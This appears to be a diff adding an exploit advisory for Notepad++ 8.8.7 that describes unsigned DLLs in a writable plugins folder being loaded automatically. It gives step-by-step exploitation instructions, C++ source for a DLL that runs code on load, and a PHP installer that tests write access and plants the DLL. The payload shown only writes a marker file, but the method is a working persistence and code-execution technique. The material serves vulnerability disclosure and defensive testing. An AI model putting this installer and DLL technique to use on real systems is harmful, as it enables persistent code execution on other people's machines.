@@ -1,0 +1,138 @@
+=============================================================================================================================================
+| # Title     : Notepad++ 8.8.7 Unsafe Plugin Persistence AutoLoad                                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://notepad-plus-plus.org/downloads/                                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211934/ 
+
+[+] Summary : 
+
+Notepad++ automatically loads any DLL placed inside its `plugins` directory
+without performing validation or signature checks. If the directory permissions
+allow write access to unprivileged users, this behavior enables persistence and
+arbitrary code execution whenever Notepad++ is started.
+
+This PoC demonstrates the issue safely by loading a benign DLL that only writes
+a text file to `C:\Users\Public\npp_poc_loaded.txt` upon being loaded.  
+No harmful behavior is performed.
+
+
+[+] Usage
+----------
+Below is the exact methodology demonstrating the vulnerability end‑to‑end.
+
+1. **Locate Plugin Directory**
+   The attacker checks for:
+       %PROGRAMFILES%\Notepad++\plugins\
+
+2. **Check Write Permissions**
+   If write access is available (weak ACL), the vulnerability is exploitable.
+
+3. **Create Malicious Plugin Folder**
+   Create a folder such as:
+       plugins\poc_plugin\
+
+4. **Place Auto‑Loaded DLL**
+   Inside the folder, place:
+       poc_plugin.dll
+
+   Notepad++ auto-loads any DLL with the same name as the folder name.
+
+5. **Trigger Execution**
+   Once Notepad++ starts, it loads the DLL automatically.
+
+6. **PoC Verification**
+   Instead of malicious code, our DLL only writes:
+       C:\Users\Public\npp_poc_loaded.txt
+
+   This provides **irrefutable evidence** that auto-loading executed successfully.
+
+This method mirrors how an actual attacker would exploit the issue — but the
+payload here is completely benign and safe.
+
+-------------------------------------------------------------------------------
+###  PoC DLL Code (C++)
+
+#include <windows.h>
+#include <fstream>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        std::ofstream f("C:\\Users\\Public\\npp_poc_loaded.txt");
+        f << "[+] PoC Loaded Successfully by Notepad++\n";
+        f.close();
+    }
+    return TRUE;
+}
+
+Compile:
+    cl /LD poc_plugin.cpp /link /OUT:poc_plugin.dll
+
+-------------------------------------------------------------------------------
+### PoC Installer (PHP)
+
+<?php
+
+function get_plugin_dir() {
+    $pf = getenv("PROGRAMFILES");
+    return $pf . "\\Notepad++\\plugins\\";
+}
+
+function check_write($dir) {
+    $t = $dir . "test_" . uniqid() . ".tmp";
+    if (@file_put_contents($t, "x") !== false) { unlink($t); return true; }
+    return false;
+}
+
+function install_poc() {
+    $dir = get_plugin_dir();
+
+    echo "[+] Checking: $dir\n";
+    if (!is_dir($dir)) { echo "[!] Notepad++ not installed.\n"; return; }
+
+    if (!check_write($dir)) {
+        echo "[!] Directory NOT writable. System NOT vulnerable.\n";
+        return;
+    }
+
+    echo "[+] Directory writable → Vulnerable.\n";
+
+    $folder = $dir . "poc_plugin\\";
+    if (!is_dir($folder)) mkdir($folder);
+
+    $dllSrc = __DIR__ . "\\poc_plugin.dll";
+    $dllDst = $folder . "poc_plugin.dll";
+
+    if (!copy($dllSrc, $dllDst)) {
+        echo "[!] Failed to deploy PoC.\n";
+        return;
+    }
+
+    echo "[+] PoC installed.\n";
+    echo "[*] Open Notepad++ to trigger auto-loading.\n";
+}
+
+install_poc();
+
+-------------------------------------------------------------------------------
+### Execution
+1. Place:
+       poc.php
+       poc_plugin.dll
+   in the same directory.
+
+2. Run:
+       php poc.php
+
+3. Launch Notepad++.
+
+4. Evidence will appear:
+       C:\Users\Public\npp_poc_loaded.txt
+
+If this file exists, Notepad++ executed the DLL automatically.
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
